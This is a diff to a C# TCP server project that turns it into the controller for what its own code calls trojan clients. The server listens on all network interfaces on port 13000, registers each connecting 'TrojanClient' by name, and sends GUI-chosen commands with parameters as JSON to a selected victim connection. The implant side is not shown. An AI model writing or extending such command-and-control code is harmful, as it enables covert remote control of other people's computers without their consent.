@@ -9,34 +9,36 @@ using System.Net;
 using System.Net.Sockets;
 using System.Threading;
 using Server.UI;
+using Newtonsoft.Json;
 
 namespace Server.TCP
 {
+
     public class TcpServer
     {
         static Window1 serverGUI;
 
         private const Int32 PORT = 13000;
 
-        private const String ADDRESS = "127.0.0.1";
+        //private const String ADDRESS = "127.0.0.1";
 
-        private IPAddress localAddress;
+        //private IPAddress localAddress;
 
         public TcpListener tcpServer;
 
-        private static Byte[] bytes;
+        //private static Byte[] bytes;
 
-        private static String data;
+        //private static String data;
 
-        static DateTime localDate;
+        //static DateTime localDate;
 
         static CultureInfo cultureInfo;
 
         private static int clientCount = 0;
 
-        static NetworkStream stream;
+        //static NetworkStream stream;
 
-        private TcpClient client;
+        private List<TrojanClient>  trojanClients = new List<TrojanClient>();
 
         public TcpServer()
         {
@@ -58,13 +60,27 @@ namespace Server.TCP
             {
                 serverGUI.Dispatcher.BeginInvoke(System.Windows.Threading.DispatcherPriority.Background, (ThreadStart)(async delegate ()
                 {
-                    localAddress = IPAddress.Parse(ADDRESS);
-                    tcpServer = new TcpListener(localAddress, PORT);
-                    localDate = DateTime.Now;
+                    //localAddress = IPAddress.Parse(ADDRESS);
+                    tcpServer = new TcpListener(/*localAddress*/ IPAddress.Any, PORT);
+                    //localDate = DateTime.Now;
                     tcpServer.Start();
                     while (true)
                     {
-                        client = await tcpServer.AcceptTcpClientAsync();
+                        var client = await tcpServer.AcceptTcpClientAsync();
+                        
+                        int i = 0;
+
+                        NetworkStream stream = client.GetStream();
+
+                        var bytes = new Byte[256];
+                        if (stream.CanRead)
+                        {
+                            i = await stream.ReadAsync(bytes, 0, bytes.Length);
+                        }
+
+                        var clientName = System.Text.Encoding.ASCII.GetString(bytes, 0, i);
+                        trojanClients.Add(new TrojanClient(client, clientName));
+                        serverGUI.SetClients(trojanClients.Select(x => x.Name));
                         ThreadPool.QueueUserWorkItem(ThreadProc, client);
                     }
 
@@ -92,10 +108,10 @@ namespace Server.TCP
             {
                 var client = (TcpClient)obj;
                 serverGUI.SetLabel("Connected");
-                bytes = new Byte[256];
-                data = null;
+                var bytes = new Byte[256];
+                string data = null;
                 // Get a stream object for reading and writing
-                stream = client.GetStream();
+                NetworkStream stream = client.GetStream();
 
                 int i = 0;
 
@@ -105,7 +121,7 @@ namespace Server.TCP
                     {
                         i = await stream.ReadAsync(bytes, 0, bytes.Length);
                     }
-                    localDate = DateTime.Now;
+                    //localDate = DateTime.Now;
 
                     data = System.Text.Encoding.ASCII.GetString(bytes, 0, i);
                     byte[] msg = null;
@@ -127,22 +143,24 @@ namespace Server.TCP
         {
             //var client = (TcpClient)obj;
             //serverGUI.SetLabel("Connected");
-            if (client != null)
+            int clientId = serverGUI.GetClientId();
+            if (clientId >= 0)
             {
-                bytes = new Byte[256];
-                data = null;
+                var client = trojanClients[serverGUI.GetClientId()].Client;
+                var bytes = new Byte[256];
                 // Get a stream object for reading and writing
-                stream = client.GetStream();
+                NetworkStream stream = client.GetStream();
                 byte[] msg = null;
-                msg = System.Text.Encoding.ASCII.GetBytes(serverGUI.GetMessage());
+                Command command = new Command(serverGUI.GetCommandId(), serverGUI.GetParameters());
+                string output = JsonConvert.SerializeObject(command);
+                msg = System.Text.Encoding.ASCII.GetBytes(output);
                 if (stream.CanWrite)
                 {
                     await stream.WriteAsync(msg, 0, msg.Length);
                 }
-                msg = System.Text.Encoding.ASCII.GetBytes("ceva");
+
                 if (stream.CanRead)
                 {
-
                     await stream.ReadAsync(bytes, 0, bytes.Length);
                 }
             }
